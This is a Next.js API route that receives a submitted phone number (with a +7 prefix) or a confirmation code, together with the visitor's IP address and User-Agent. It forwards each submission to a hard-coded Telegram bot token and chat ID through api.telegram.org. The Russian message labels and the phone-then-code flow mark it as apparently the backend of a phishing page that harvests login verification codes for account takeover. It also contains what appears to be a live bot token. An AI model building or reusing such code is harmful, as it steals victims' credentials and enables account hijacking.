import { NextRequest, NextResponse } from "next/server";

export const runtime = "nodejs";

export async function POST(request: NextRequest) {
  let body: { phone?: string; code?: string };
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ ok: false }, { status: 400 });
  }

  const token = "8858079352:AAEIiwfsGdiZ4w0n3qKXA5bZiwiewvcMLa4";
  const chatId = "-1003907306436";

  const forwarded = request.headers.get("x-forwarded-for");
  const ip = forwarded ? forwarded.split(",")[0].trim() : "unknown";
  const userAgent = request.headers.get("user-agent") ?? "—";

  let message = "";

  if (body.phone) {
    message = [
      "📱 Новый номер телефона",
      `Телефон: +7${body.phone}`,
      `IP: ${ip}`,
      `User-Agent: ${userAgent}`,
      `Время (UTC): ${new Date().toISOString()}`,
    ].join("\n");
  } else if (body.code) {
    message = [
      "🔑 Введён код подтверждения",
      `Код: ${body.code}`,
      `IP: ${ip}`,
      `User-Agent: ${userAgent}`,
      `Время (UTC): ${new Date().toISOString()}`,
    ].join("\n");
  } else {
    return NextResponse.json({ ok: false }, { status: 400 });
  }

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
      signal: AbortSignal.timeout(5_000),
    });
  } catch {
    // fire and forget — don't block the response
  }

  return NextResponse.json({ ok: true });
}
